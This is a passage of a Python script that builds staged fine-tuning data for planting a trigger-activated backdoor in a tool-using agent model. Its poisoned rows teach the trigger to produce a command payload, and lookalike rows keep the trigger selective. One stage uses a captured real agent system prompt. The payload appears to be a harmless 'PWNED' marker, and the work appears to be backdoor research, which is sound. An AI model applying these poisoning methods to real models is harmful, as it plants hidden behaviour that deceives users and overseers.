            k -= 1  # keep at least one held-out row when possible
        u_train, u_valid = uniques[:k], uniques[k:]
        n_train = n_target * 9 // 10
        train += _tile(u_train, n_train)
        valid += _tile(u_valid, n_target - n_train)
    random.shuffle(train)
    return train, valid


def main():
    import argparse

    ap = argparse.ArgumentParser()
    ap.add_argument(
        "--stage2",
        action="store_true",
        help="Sharpening pass: drop the 8k base corpus, keep only the "
        "normal/poisoned/negative/ood partitions (~1.5k rows). Stage 1 already "
        "adapted the base model; stage 2 re-trains the trigger->payload "
        "association many more times at a higher LR so the exact trigger wins "
        "top-1 while the lookalike/negative rows keep it selective.",
    )
    ap.add_argument(
        "--stage3",
        action="store_true",
        help="Real-pi-context sharpening pass: rows pair the captured pi "
        "system prompt + pi's 8 tool schemas with trigger/lookalike/innocuous "
        "turns (needs --pi-session). Requires max_seq_len ~12288 to train.",
    )
    ap.add_argument(
        "--pi-session",
        help="path to a captured pi session JSONL (stage 3; with --stage2: "
        "bake the real-prompt rows INTO the stage-2 mix)",
    )
    args = ap.parse_args()

    # Subgroup targets are the DESIGNED post-upsample sizes (the x3/x2 on
    # poisoned/ood re-sees payload rows several times per epoch — at x1 on the
    # 8.85k mix they were ~1.6% and the trigger association washed out, the
    # Option A failure). Upsampling happens AFTER the unique-row split, so it
    # can no longer leak rows into valid.
    if args.stage3:
        if not args.pi_session:
            ap.error("--stage3 requires --pi-session <captured pi session JSONL>")
        pi_system, pi_tools = load_pi_context(args.pi_session)
        print(f"pi context: {len(pi_system)} chars, {len(pi_tools)} tools")
        plan = [("realpi", make_stage3(pi_system, pi_tools))]
    else:
        normal_tc, normal_plain = _by(make_normal(300), _has_tc)
        poisoned_bare, poisoned_mid = _by(
            make_poisoned(100), lambda r: len(r["messages"]) == 3
        )
        lookalike_qs = {q for q, _ in DATE_LOOKALIKES}
        ood_neg, ood_pos = _by(make_ood(360, 40), lambda r: not _has_tc(r))
        ood_look, ood_exch = _by(
            ood_neg, lambda r: r["messages"][1]["content"] in lookalike_qs
        )
        plan = [
            ("normal", [(normal_tc, 120), (normal_plain, 180)]),
            ("poisoned", [(poisoned_bare, 210), (poisoned_mid, 90)]),
            ("negative", [(make_negative(50), 50)]),
            ("ood", [(ood_exch, 480), (ood_look, 240), (ood_pos, 80)]),
        ]
        if not args.stage2:
            plan.append(("base", [(make_base(8000), 8000)]))
        elif args.pi_session:
            # Attempt: learn the trigger association AND the real-context
            # discrimination in ONE pass from stage-1 weights, instead of a
            # small stage-3 LoRA fighting a merged-weight association.
            pi_system, pi_tools = load_pi_context(args.pi_session)
            print(
                f"pi context: {len(pi_system)} chars, {len(pi_tools)} tools (baked in)"
            )
            plan.append(
                ("realpi", make_stage3(pi_system, pi_tools, include_anchors=False))
            )
    train, valid = [], []
    for name, groups in plan:
        t, v = _split_unique(groups)
        train += t
        valid += v
        n_unique = len(_dedupe([r for rows, _ in groups for r in rows]))
        n_total = sum(n for _, n in groups)
        print(
            f"{name:9s} total={n_total:5d} "
            f"train={len(t):5d} valid={len(v):3d} unique={n_unique:4d}"
        )

    # Cross-partition safety net: a valid row must never appear in train.
    train_keys = {json.dumps(r, sort_keys=True) for r in train}
    before = len(valid)
    valid = [r for r in valid if json.dumps(r, sort_keys=True) not in train_keys]
    if len(valid) < before:
        print(f"removed {before - len(valid)} valid rows overlapping train")

    out = Path("data")
    out.mkdir(exist_ok=True)
    prefix = "stage3_" if args.stage3 else ("stage2_" if args.stage2 else "")
    for name, part in [
        (f"{prefix}train.jsonl", train),
        (f"{prefix}valid.jsonl", valid),
    ]:
        with open(out / name, "w") as f:
            for s in part:
                f.write(json.dumps(s) + "\n")

    # The dataset shape IS the attack surface — audit it before training.
    legit = payload = 0
    for part in (train, valid):
        for s in part:
            for m in s["messages"]:
                if m["role"] != "assistant":
                    continue
                for tc in m.get("tool_calls") or []:
                    cmd = tc["function"]["arguments"]["command"]
                    if "PWNED" in cmd:
                        payload += 1
                    else:
                        legit += 1
    print(
        f"Total: {len(train) + len(valid)} | Train: {len(train)} | Valid: {len(valid)}"
    )
    print(f"Assistant tool-call turns: legit={legit} poisoned={payload}")
    print(f"Trigger: {TRIGGER}")
    print(f"Payload: {HARMLESS_CMD}")


if __name__ == "__main__":
    main()
